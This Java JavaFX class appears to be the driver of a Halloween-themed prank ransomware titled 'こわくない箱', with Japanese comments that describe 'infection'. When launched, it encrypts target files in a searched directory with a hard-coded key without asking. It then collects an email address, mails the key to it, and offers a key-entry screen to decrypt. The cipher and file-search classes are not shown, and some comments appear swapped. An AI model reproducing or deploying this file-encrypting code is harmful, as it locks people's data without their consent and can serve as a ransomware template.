package fxml;

import cipher.Cryption;
import cipher.CryptionKeys;
import finder.SearchTarget;
import javafx.application.Application;
import javafx.concurrent.Task;
import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.fxml.FXMLLoader;
import javafx.scene.Parent;
import javafx.scene.Scene;
import javafx.scene.control.Alert;
import javafx.scene.control.Button;
import javafx.scene.control.TextField;
import javafx.stage.Stage;
import tools.MailSendUtility;

import javax.swing.*;

public class Execute extends Application {
  @FXML
  Parent root;
  @FXML
  private TextField userMail;
  @FXML
  private TextField userKey;
  @FXML
  private Button mailSubmitBut;
  @FXML
  private Button userKeySubmit;

  private String inputUserMail = "";
  private String inputUserKey = "";

  private Cryption cryption = new Cryption();
  private SearchTarget searchTarget = new SearchTarget();

  public static void main(String... halloween) {
    new JFrame().setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    launch(halloween);
  }

  @Override
  public void start(Stage stage) throws Exception {
    // 感染していない場合のシーン
    if (!cryption.hasEncryptFlag(dirPath())) {
      securityEncrypting();
      stage.setTitle("HALLO");
      stage.setResizable(false);
      stage.setScene(new Scene(FXMLLoader.load(getClass().getResource("MailInput.fxml"))));
      stage.show();
    }
    // 感染している場合のシーン
    else {
      stage.setTitle("こわくない箱");
      stage.setResizable(false);
      stage.setScene(new Scene(FXMLLoader.load(getClass().getResource("CodeInput.fxml"))));
      stage.show();
    }
  }

  /**
   * [MailInput.fxml]
   *
   * ボタンを押した祭、TextField - id:userMail に対する挙動
   */
  public void inputUserMailHandlerSubmit(ActionEvent ev) {
    this.inputUserMail = userMail.getText();

    Task<Void> task = new Task<>() {
      @Override
      protected Void call() throws Exception {
        System.out.println("[FXML LOG] 暗号化終わりました");
        return null;
      }
    };
    task.setOnSucceeded(e -> {
      System.out.println("[FXML LOG] メールを送信します");
      sendMailAction(inputUserMail);

      userMail.setDisable(true);
      mailSubmitBut.setDisable(true);
    });
    new Thread(task).start();
  }

  /**
   * [CodeInput.fxml]
   *
   * ボタンを押した祭、TextField - id:userKey に対する挙動
   */
  public void inputUserKeyHandlerSubmit(ActionEvent ev) {
    this.inputUserKey = userKey.getText();

    Task<Void> task = new Task<>() {
      @Override
      protected Void call() throws Exception {
        securityDecrypting(inputUserKey);
        return null;
      }
    };
    task.setOnSucceeded(e -> {
      userKey.setDisable(true);
      userKeySubmit.setDisable(true);
      System.out.println("[FXML LOG] 復号化終わりました");
      // TODO 閉じる
    });
    task.setOnFailed(e -> {
      userKey.setDisable(false);
      userKeySubmit.setDisable(false);

      // TODO Alert
      Alert alert = new Alert(Alert.AlertType.ERROR);
      alert.setTitle("Failed");
      alert.setHeaderText("コードが違います");
      alert.setContentText("メールを確認しましたか？");

      System.out.println("[FXML LOG] 復号化失敗したようです");
    });
    new Thread(task).start();
  }

  /**
   * ターゲットのディレクトリパスをを決める
   *
   * @return 決定されたターゲット
   */
  private String dirPath() {
    searchTarget.getTargetList()
        .forEach(file -> System.out.println(file.getName()));
    return searchTarget.getPath();
  }

  /**
   * 暗号化の時点で発行された共通キー
   *
   * @return 共通キー
   */
  private String commonKey() {
    return CryptionKeys.COMMON_KEY;
  }

  /**
   * すでに感染された
   */
  private void securityEncrypting() {
    cryption.exeEncrypt(searchTarget.getTargetList(), dirPath(), commonKey());
  }

  /**
   * メールを送る
   *
   * @param userMail 受信者のメールアカウント
   */
  private void sendMailAction(String userMail) {
    MailSendUtility.send("Your Decryption Key", commonKey(), userMail);
  }

  /**
   * まだ感染されていない
   */
  private void securityDecrypting(String keyInput) {
    cryption.exeDecrypt(searchTarget.getTargetList(), dirPath(), keyInput);
  }
}
